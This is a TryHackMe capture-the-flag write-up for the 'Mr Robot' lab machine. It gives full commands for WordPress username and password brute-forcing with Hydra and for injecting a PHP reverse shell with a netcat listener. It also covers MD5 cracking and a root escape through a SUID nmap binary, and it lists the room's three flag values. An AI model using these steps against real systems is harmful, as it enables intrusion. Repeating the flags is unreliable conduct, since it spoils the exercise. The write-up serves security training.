#  Mr Robot

> **Platform:** TryHackMe  
> **Difficulty:** Medium  
> **Category:** Web / WordPress / RCE / Linux PrivEsc  
> **Date Completed:** 2026-03-21
  
> **Room Link:** [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Privilege Escalation](#privilege-escalation)
6. [Flags / Keys](#flags--keys)
7. [Key Takeaways](#key-takeaways)

---

##  Room Overview

An Mr. Robot themed CTF with three hidden keys to find. The machine runs a WordPress site with credentials hidden inside a publicly accessible wordlist on the server. Gaining access requires brute-forcing WordPress credentials, uploading a PHP reverse shell, cracking an MD5 hash for lateral movement, and finally exploiting an SUID-enabled `nmap` binary to escalate to root.

**Goal:**  
Find all three keys hidden across the filesystem.

**Skills Practiced:**  
Nmap & Nikto scanning, Gobuster directory fuzzing, `robots.txt` recon, Hydra WordPress brute-force, PHP reverse shell, MD5 cracking with Hashcat, SUID binary exploitation via `nmap --interactive`.

---

##  Reconnaissance

### Network Scanning

```bash
sudo nmap -sS -sC -sV -A -Pn 10.49.136.165
```

**Findings:**

| Port | State  | Service | Notes |
|------|--------|---------|-------|
| 22   | closed | SSH     | Not accessible |
| 80   | open   | HTTP    | Apache httpd |
| 443  | open   | HTTPS   | Apache httpd — self-signed cert for `www.example.com` |

### Nikto Scan

```bash
sudo nikto -host http://10.49.136.165
```

**Notable findings:**
- PHP version `5.5.29` exposed via `X-Powered-By` header
- Missing `X-XSS-Protection` and `X-Content-Type-Options` headers
- Apache server header disclosed

---

##  Enumeration

### Directory Bruteforcing

```bash
gobuster dir \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -u http://10.49.136.165
```

**Key findings:**

| Path | Status | Note |
|------|--------|------|
| `/robots` | 200 | Accessible `robots.txt` |
| `/wp-login` | 200 | WordPress login page |
| `/wp-admin` | 302 | WordPress admin panel |
| `/wp-content` | 301 | WordPress content directory |
| `/license` | 200 | Info page |
| `/intro` | 200 | Intro page |

### robots.txt

Visiting `http://10.49.136.165/robots.txt` reveals two entries:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**Key 1** is directly accessible:

```
http://10.49.136.165/key-1-of-3.txt
```

`fsocity.dic` is a large wordlist — likely used for credential brute-forcing.

---

##  Exploitation

### WordPress — Username Enumeration

The WordPress login page at `/wp-login` returns different error messages for invalid usernames vs. invalid passwords. Using Hydra to enumerate valid usernames:

```bash
hydra -L fsocity.dic -p test 10.49.136.165 \
  http-post-form \
  "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"
```

**Username found: `Elliot`**

### Deduplicating the Wordlist

`fsocity.dic` contains 858,235 entries with heavy duplication. Sorting and deduplicating dramatically reduces the brute-force time:

```bash
sort fsocity.dic | uniq > fsocity_sorted.dic
```

### WordPress — Password Brute-Force

```bash
hydra -l Elliot -P fsocity_sorted.dic 10.49.136.165 \
  http-post-form \
  "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:S=302"
```

**Credentials found: `Elliot` / `ER28-0652`**

### PHP Reverse Shell via WordPress

Log in at `http://10.49.136.165/wp-login` with the found credentials and navigate to the WordPress admin panel (`/wp-admin`). Inject a PHP reverse shell into a theme template (e.g. the 404 page under **Appearance → Editor**).

Set up the listener:

```bash
nc -nlvp 9001
```

Trigger the shell by visiting the injected page:

```
http://10.49.136.165/pwned
```

Shell received as `daemon`. Upgrade to a full TTY:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
```

### Finding Key 2

```bash
ls -la /home/robot
```

```
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

Key 2 is only readable by the `robot` user. However, the MD5 password file is world-readable:

```bash
cat /home/robot/password.raw-md5
```

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

### Cracking the MD5 Hash

```bash
hashcat -m 0 --force c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt
```

**Cracked: `abcdefghijklmnopqrstuvwxyz`**

### Switching to Robot

```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
```

---

##  Privilege Escalation

### SUID Binary Enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

**Notable SUID binary:** `/usr/local/bin/nmap`

An older version of `nmap` (pre-5.20) includes an `--interactive` mode that allows shell commands to be executed — and since the binary has the SUID bit set, those commands run as root.

### Escalation via `nmap --interactive`

```bash
nmap --interactive
```

```
nmap> !sh
# whoami
root
```

Root shell obtained. 

### Key 3

```bash
cat /root/key-3-of-3.txt
```

---

##  Flags / Keys

| Key | Value |
|-----|-------|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `822c73956184f694993bede3eb39f959` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |

---

##  Key Takeaways

- **`robots.txt` is not a security control.** It directly exposed both the first key and the custom wordlist used to crack the passwords. Never list sensitive paths there.
- **WordPress error messages leak usernames.** The difference between "Invalid username" and "Incorrect password" allows user enumeration — modern WordPress versions have addressed this but many installations are outdated.
- **Deduplicating wordlists saves massive time.** `fsocity.dic` had 858K entries but far fewer unique values. `sort | uniq` reduced it significantly and cut brute-force time from hours to minutes.
- **MD5 is not a secure password hash.** `abcdefghijklmnopqrstuvwxyz` was cracked in under a second. Always use bcrypt, Argon2, or scrypt.
- **SUID on `nmap` is a critical misconfiguration.** The `--interactive` mode shell escape is well documented on GTFOBins. SUID should only be set on binaries that explicitly require it, and never on tools like `nmap`.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning & service detection |
| Nikto | Web server vulnerability scanning |
| Gobuster | Directory & path enumeration |
| Hydra | WordPress username & password brute-force |
| PHP Reverse Shell | Remote code execution via WordPress theme editor |
| Netcat | Reverse shell listener |
| Hashcat | MD5 hash cracking |
| `nmap --interactive` | SUID-based privilege escalation to root |

---

##  References

- [GTFOBins — nmap](https://gtfobins.github.io/gtfobins/nmap/)
- [HackTricks — WordPress Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
- [Pentestlab — SUID Executables](https://pentestlab.blog/2017/09/25/suid-executables/)
- [PHP Reverse Shell — pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)

---

*Writeup by Avaneesh*
